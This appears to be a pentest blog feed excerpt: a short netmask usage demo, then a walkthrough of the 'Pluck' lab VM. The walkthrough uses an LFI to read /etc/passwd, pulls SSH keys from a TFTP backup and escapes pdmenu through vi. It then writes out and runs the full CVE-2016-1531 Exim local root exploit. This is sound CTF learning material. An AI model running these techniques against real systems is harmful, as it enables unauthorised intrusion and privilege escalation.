<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This is netmask, an address netmask generation utility
</span><span class='line'>Usage: netmask spec [spec ...]
</span><span class='line'>  -h, --help          Print a summary of the options
</span><span class='line'>  -v, --version           Print the version number
</span><span class='line'>  -d, --debug         Print status/progress information
</span><span class='line'>  -s, --standard      Output address/netmask pairs
</span><span class='line'>  -c, --cidr          Output CIDR format address lists
</span><span class='line'>  -i, --cisco         Output Cisco style address lists
</span><span class='line'>  -r, --range         Output ip address ranges
</span><span class='line'>  -x, --hex           Output address/netmask pairs in hex
</span><span class='line'>  -o, --octal         Output address/netmask pairs in octal
</span><span class='line'>  -b, --binary            Output address/netmask pairs in binary
</span><span class='line'>  -n, --nodns         Disable DNS lookups for addresses
</span><span class='line'>  -f, --files         Treat arguments as input files
</span><span class='line'>Definitions:
</span><span class='line'>  a spec can be any of:
</span><span class='line'>    address
</span><span class='line'>    address:address
</span><span class='line'>    address:+address
</span><span class='line'>    address/mask
</span><span class='line'>  an address can be any of:
</span><span class='line'>    N     decimal number
</span><span class='line'>    0N        octal number
</span><span class='line'>    0xN       hex number
</span><span class='line'>    N.N.N.N   dotted quad
</span><span class='line'>    hostname  dns domain name
</span><span class='line'>  a mask is the number of bits set to one from the left</span></code></pre></td></tr></table></div></figure>


<h2>netmask usage</h2>

<ul>
<li>output standard address / netmask pairs</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -s 192.168.217.0/24
</span><span class='line'>  192.168.217.0/255.255.255.0  </span></code></pre></td></tr></table></div></figure>


<ul>
<li>CIDR notation</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -c google.com
</span><span class='line'>  216.58.210.14/32
</span><span class='line'>2a00:1450:4001:81d::200e/128</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Cisco-style notation</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -i google.com
</span><span class='line'>  216.58.210.14 0.0.0.0        
</span><span class='line'>2a00:1450:4001:81d::200e ::   </span></code></pre></td></tr></table></div></figure>


<ul>
<li>IP ranges</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netmask -r 192.168.217.0/24
</span><span class='line'>  192.168.217.0-192.168.217.255 (256)</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>&lt; Your ignorance cramps my conversation. &gt;
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Got Pluck?]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
    <updated>2017-07-06T06:28:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
</span><span class='line'>|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
</span><span class='line'>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: Pluck
</span><span class='line'>3306/tcp open  mysql   MySQL (unauthorized)
</span><span class='line'>5355/tcp open  llmnr?</span></code></pre></td></tr></table></div></figure>


<p>First order of business, the web server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/pluck.png" title="pluck" alt="pluck"></p>

<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+ Server: Apache/2.4.18 (Ubuntu)
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
</span><span class='line'>+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
</span><span class='line'>+ OSVDB-3092: /admin.php: This might be interesting...
</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
</span><span class='line'>+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)</span></code></pre></td></tr></table></div></figure>


<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/admin.png" title="admin" alt="admin sqli"></p>

<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span><span class='line'>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span><span class='line'>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span><span class='line'>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span><span class='line'>syslog:x:104:108::/home/syslog:/bin/false
</span><span class='line'>_apt:x:105:65534::/nonexistent:/bin/false
</span><span class='line'>messagebus:x:106:109::/var/run/dbus:/bin/false
</span><span class='line'>mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>lxd:x:108:65534::/var/lib/lxd/:/bin/false
</span><span class='line'>uuidd:x:109:114::/run/uuidd:/bin/false
</span><span class='line'>dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
</span><span class='line'>sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>pollinate:x:112:1::/var/cache/pollinate:/bin/false
</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
</span><span class='line'>Debian-exim:x:113:119::/var/spool/exim4:/bin/false
</span><span class='line'>peter:x:1001:1001:,,,:/home/peter:/bin/bash
</span><span class='line'>paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
</span><span class='line'>backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh</span></code></pre></td></tr></table></div></figure>


<p>The last entry is interesting. I used the LFI to look at the script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>########################
</span><span class='line'># Server Backup script #
</span><span class='line'>########################
</span><span class='line'>
</span><span class='line'>#Backup directories in /backups so we can get it via tftp
</span><span class='line'>
</span><span class='line'>echo "Backing up data"
</span><span class='line'>tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2& &gt; /dev/null
</span><span class='line'>echo "Backup complete"</span></code></pre></td></tr></table></div></figure>


<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -sU -p69 192.168.217.147
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-06 09:59 EDT
</span><span class='line'>Nmap scan report for 192.168.217.147
</span><span class='line'>Host is up (0.00016s latency).
</span><span class='line'>PORT   STATE         SERVICE
</span><span class='line'>69/udp open|filtered tftp</span></code></pre></td></tr></table></div></figure>


<p>I got the archive via T<a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tftp 192.168.217.147
</span><span class='line'>tftp&gt; get /backups/backup.tar
</span><span class='line'>Received 1824718 bytes in 1.4 seconds</span></code></pre></td></tr></table></div></figure>


<p>Extracted it to find some home directory contents, besides the source for the website:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar -xvf backup.tar 
</span><span class='line'>home/
</span><span class='line'>home/bob/
</span><span class='line'>home/bob/.bashrc
</span><span class='line'>home/bob/.sudo_as_admin_successful
</span><span class='line'>home/bob/.profile
</span><span class='line'>home/bob/.bash_logout
</span><span class='line'>home/paul/
</span><span class='line'>home/paul/keys/
</span><span class='line'>home/paul/keys/id_key3.pub
</span><span class='line'>home/paul/keys/id_key2.pub
</span><span class='line'>home/paul/keys/id_key2
</span><span class='line'>home/paul/keys/id_key4.pub
</span><span class='line'>home/paul/keys/id_key5.pub
</span><span class='line'>home/paul/keys/id_key6
</span><span class='line'>home/paul/keys/id_key1
</span><span class='line'>home/paul/keys/id_key5
</span><span class='line'>home/paul/keys/id_key1.pub
</span><span class='line'>home/paul/keys/id_key6.pub
</span><span class='line'>home/paul/keys/id_key4
</span><span class='line'>home/paul/keys/id_key3
</span><span class='line'>home/paul/.bashrc
</span><span class='line'>home/paul/.profile
</span><span class='line'>home/paul/.bash_logout
</span><span class='line'>home/peter/
</span><span class='line'>home/peter/.bashrc
</span><span class='line'>home/peter/.profile
</span><span class='line'>home/peter/.bash_logout
</span><span class='line'>var/www/html/
</span><span class='line'>var/www/html/fonts/
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.svg
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff2
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.ttf
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff
</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.eot
</span><span class='line'>var/www/html/about.php
</span><span class='line'>var/www/html/index.php
</span><span class='line'>var/www/html/footer.php
</span><span class='line'>var/www/html/css/
</span><span class='line'>var/www/html/css/bootstrap.css.map
</span><span class='line'>var/www/html/css/bootstrap.min.css.map
</span><span class='line'>var/www/html/css/bootstrap-theme.css
</span><span class='line'>var/www/html/css/bootstrap-theme.min.css
</span><span class='line'>var/www/html/css/bootstrap.min.css
</span><span class='line'>var/www/html/css/bootstrap-theme.min.css.map
</span><span class='line'>var/www/html/css/bootstrap-theme.css.map
</span><span class='line'>var/www/html/css/bootstrap.css
</span><span class='line'>var/www/html/header.php
</span><span class='line'>var/www/html/admin.php
</span><span class='line'>var/www/html/js/
</span><span class='line'>var/www/html/js/jquery.min.js
</span><span class='line'>var/www/html/js/bootstrap.js
</span><span class='line'>var/www/html/js/npm.js
</span><span class='line'>var/www/html/js/bootstrap.min.js</span></code></pre></td></tr></table></div></figure>


<p>Bob&rsquo;s directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/bob# ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
</span><span class='line'>-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
</span><span class='line'>-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
</span><span class='line'>-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
</span><span class='line'>-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful</span></code></pre></td></tr></table></div></figure>


<p>That sudo file was empty. On to paul:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/paul# ls -la
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
</span><span class='line'>-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
</span><span class='line'>-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
</span><span class='line'>-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
</span><span class='line'>root@kali:~/home/paul# ls -la keys/
</span><span class='line'>total 56
</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
</span><span class='line'>-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub</span></code></pre></td></tr></table></div></figure>


<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/peter# ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
</span><span class='line'>-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
</span><span class='line'>-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
</span><span class='line'>-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile</span></code></pre></td></tr></table></div></figure>


<h2>Privilege escalation</h2>

<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/pdmenu.png" title="pdmenu" alt="pdmenu"></p>

<p>So, what is pdmenu?</p>

<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>

<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:set shell=/bin/bash
</span><span class='line'>:!bash</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>That dropped me into paul&rsquo;s shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ id
</span><span class='line'>uid=1002(paul) gid=1002(paul) groups=1002(paul)</span></code></pre></td></tr></table></div></figure>


<p>SUID enumeration led me to the next step:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
</span><span class='line'>/usr/exim/bin/exim-4.84-7
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/bin/at
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/pkexec
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/traceroute6.iputils
</span><span class='line'>/usr/bin/newuidmap
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/newgidmap
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span><span class='line'>/usr/lib/policykit-1/polkit-agent-helper-1
</span><span class='line'>/usr/lib/s-nail/s-nail-privsep
</span><span class='line'>/usr/lib/openssh/ssh-keysign
</span><span class='line'>/usr/lib/eject/dmcrypt-get-device
</span><span class='line'>/bin/su
</span><span class='line'>/bin/umount
</span><span class='line'>/bin/mount
</span><span class='line'>/bin/fusermount
</span><span class='line'>/bin/ping
</span><span class='line'>/bin/ntfs-3g</span></code></pre></td></tr></table></div></figure>


<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ vi rootme.sh 
</span><span class='line'>paul@pluck:~$ cat rootme.sh 
</span><span class='line'>echo [ CVE-2016-1531 local root exploit
</span><span class='line'>cat &gt; /tmp/root.pm &lt;&lt; EOF
</span><span class='line'>package root;
</span><span class='line'>use strict;
</span><span class='line'>use warnings;
</span><span class='line'> 
</span><span class='line'>system("/bin/sh");
</span><span class='line'>EOF
</span><span class='line'>PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
</span><span class='line'>
</span><span class='line'>paul@pluck:~$ ./rootme.sh 
</span><span class='line'>[ CVE-2016-1531 local root exploit
</span><span class='line'># whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>The flag is mine!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat /root/flag.txt
</span><span class='line'>
</span><span class='line'>Congratulations you found the flag
</span><span class='line'>
</span><span class='line'>---------------------------------------
</span><span class='line'>
</span><span class='line'>######   ((((((((((((((((((((((((((((((
</span><span class='line'>#########   (((((((((((((((((((((((((((
</span><span class='line'>,,##########   ((((((((((((((((((((((((
</span><span class='line'>@@,,,##########   (((((((((((((((((((((
</span><span class='line'>@@@@@,,,##########                     
</span><span class='line'>@@@@@@@@,,,############################
</span><span class='line'>@@@@@@@@@@@,,,#########################
</span><span class='line'>@@@@@@@@@,,,###########################
</span><span class='line'>@@@@@@,,,##########                    
</span><span class='line'>@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
</span><span class='line'>,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
</span><span class='line'>##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
</span><span class='line'>#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&</span></code></pre></td></tr></table></div></figure>


<p>Interesting twist on this VM with the pdbmenu escape!</p>

<p><strong>Learn more</strong></p>

